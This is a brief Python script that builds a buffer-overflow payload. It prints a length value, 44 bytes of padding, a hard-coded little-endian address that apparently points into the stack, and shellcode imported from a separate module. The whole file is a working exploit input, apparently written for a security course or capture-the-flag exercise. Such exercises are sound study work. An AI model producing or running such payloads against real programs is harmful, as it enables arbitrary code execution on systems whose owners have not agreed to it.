from shellcode import shellcode
import sys
sys.stdout.buffer.write(0x40000000.to_bytes(4,"little") +44*0xff.to_bytes(1,"little") +0xfff6cef0.to_bytes(4,"little")+shellcode)
